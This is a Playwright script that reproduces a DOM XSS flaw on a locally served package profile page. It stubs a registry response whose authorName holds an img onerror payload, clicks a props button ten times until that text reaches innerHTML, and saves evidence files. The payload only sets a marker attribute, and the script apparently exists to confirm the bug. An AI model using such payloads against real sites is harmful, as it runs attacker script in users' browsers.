/**
 * DOM XSS on the package profile page.
 *
 * The React app reads authorName from https://pkgregistryapp.com/package.
 * This script stubs that response locally (Playwright route, no fixture edits)
 * and clicks the props button 10 times, which copies the text into innerHTML.
 *
 * Prereq: the app is already serving http://127.0.0.1:3010
 *         (see README.md). playwright-core and its Chromium build must be
 *         importable; CHROME_PATH can override the browser binary.
 */
import { createRequire } from "node:module";
import { mkdirSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const evidenceDir = join(here, "evidence");
mkdirSync(evidenceDir, { recursive: true });

const require = createRequire(import.meta.url);
const playwrightCore =
  process.env.PLAYWRIGHT_CORE ||
  "/home/node/.npm/_npx/e41f203b7505f1fb/node_modules/playwright-core";
const { chromium } = require(playwrightCore);

const BASE = process.env.BASE || "http://127.0.0.1:3010";
const PAYLOAD =
  "Scott <img src=x onerror=\"document.documentElement.dataset.pwned='sassyreg'\">";
const chromePath =
  process.env.CHROME_PATH ||
  "/home/node/.cache/ms-playwright/chromium-1234/chrome-linux/chrome";

const registryBody = {
  authorName: PAYLOAD,
  twitterLink: "https://example.test/scottsassy",
  authorScreenshotDescription: "plain control description",
  packageManifest: {
    name: "cli-prompts",
    version: "1.1.2",
    description: "local stub",
  },
};

const browser = await chromium.launch({
  executablePath: chromePath,
  headless: true,
});
const page = await browser.newPage();
const consoleLines = [];
const pageErrors = [];
page.on("console", (msg) => consoleLines.push(`${msg.type()}: ${msg.text()}`));
page.on("pageerror", (err) => pageErrors.push(String(err)));

let registryHits = 0;
await page.route("https://pkgregistryapp.com/**", async (route) => {
  registryHits += 1;
  await route.fulfill({
    status: 200,
    contentType: "application/json",
    body: JSON.stringify(registryBody),
  });
});

await page.goto(`${BASE}/package-profile`, { waitUntil: "domcontentloaded" });
await page.waitForFunction(
  (needle) => {
    const el = document.getElementById("authorName");
    return el && el.textContent.includes(needle);
  },
  "onerror",
  { timeout: 20000 },
);

const before = await page.evaluate(() => ({
  authorText: document.getElementById("authorName")?.textContent ?? null,
  authorHtml: document.getElementById("authorName")?.innerHTML ?? null,
  pwned: document.documentElement.dataset.pwned || null,
  imgCount: document.querySelectorAll("#errorMessage img").length,
}));

const heart = page.locator("button:has(i.icon-heart-2)").first();
for (let i = 0; i < 10; i += 1) {
  await heart.click();
}

await page.waitForFunction(
  () => document.documentElement.dataset.pwned === "sassyreg",
  { timeout: 10000 },
);

const after = await page.evaluate(() => ({
  pwned: document.documentElement.dataset.pwned || null,
  propsText: document.body.innerText.includes("10 props from you"),
  errorHtml: document.getElementById("errorMessage")?.innerHTML ?? null,
  imgCount: document.querySelectorAll("#errorMessage img").length,
  imgOnerror:
    document.querySelector("#errorMessage img")?.getAttribute("onerror") ?? null,
}));

const result = {
  reproduced: after.pwned === "sassyreg" ? "yes" : "no",
  registryHits,
  payload: PAYLOAD,
  before,
  after,
  pageErrors,
  consoleLines: consoleLines.slice(0, 30),
};

writeFileSync(join(evidenceDir, "result.json"), JSON.stringify(result, null, 2));
writeFileSync(
  join(evidenceDir, "registry-stub.json"),
  JSON.stringify(registryBody, null, 2),
);
writeFileSync(
  join(evidenceDir, "error-message.html"),
  after.errorHtml || "",
);

console.log(JSON.stringify({ reproduced: result.reproduced, pwned: after.pwned, imgCount: after.imgCount }, null, 2));
await browser.close();
if (result.reproduced !== "yes") process.exit(1);
